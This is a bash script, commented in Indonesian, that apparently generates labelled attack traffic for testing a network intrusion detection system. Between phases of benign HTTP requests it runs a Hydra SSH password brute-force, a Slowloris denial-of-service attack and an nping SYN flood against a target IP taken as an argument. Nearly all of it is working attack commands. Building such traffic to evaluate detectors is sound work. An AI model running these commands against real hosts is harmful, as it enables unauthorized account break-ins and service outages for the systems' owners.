#!/bin/bash
# ============================================================
# NIDS01 - CLEAN ATTACK SCENARIO (untuk RT-S1 / RT-S3)
# Serangan standar tanpa manipulasi paket (no evasion).
# Timeline 7 menit sesuai schedule-nids01.json:
#   0-1 : Benign warm-up
#   1-3 : SSH Brute-Force (Hydra -> port 22)
#   3-5 : DoS Slowloris (-> port 80)
#   5-6 : DDoS SYN Flood (nping -> port 80)
#   6-7 : Benign cool-down
# ============================================================
set -u
TARGET_IP="${1:-10.3.2.38}"
PASS_LIST="/opt/attack/passwords.txt"

log() { echo "[$(date +%H:%M:%S)] $*"; }

log "=== CLEAN ATTACK START -> target $TARGET_IP ==="

# --- Phase 0: Benign warm-up (1 menit) ---
log "Phase 0 (0-1m): Benign warm-up (HTTP curl)"
end=$((SECONDS+60))
while [ $SECONDS -lt $end ]; do curl -s -m 2 "http://$TARGET_IP/" >/dev/null 2>&1; sleep 1; done

# --- Phase 1: SSH Brute-Force (2 menit) ---
log "Phase 1 (1-3m): SSH Brute-Force (Hydra)"
timeout 120 hydra -l testuser -P "$PASS_LIST" -t 4 -W 1 "$TARGET_IP" ssh 2>&1 | tail -3

# --- Phase 2: DoS Slowloris (2 menit) ---
log "Phase 2 (3-5m): DoS Slowloris (port 80)"
timeout 120 slowloris "$TARGET_IP" -p 80 -s 150 2>&1 | tail -2

# --- Phase 3: DDoS SYN Flood (1 menit) ---
log "Phase 3 (5-6m): DDoS SYN Flood (nping, rate 200/s)"
sudo timeout 60 nping --tcp --flags SYN --rate 200 -p 80 -c 12000 "$TARGET_IP" 2>&1 | tail -3

# --- Phase 4: Benign cool-down (1 menit) ---
log "Phase 4 (6-7m): Benign cool-down (HTTP curl)"
end=$((SECONDS+60))
while [ $SECONDS -lt $end ]; do curl -s -m 2 "http://$TARGET_IP/" >/dev/null 2>&1; sleep 1; done

log "=== CLEAN ATTACK DONE ==="
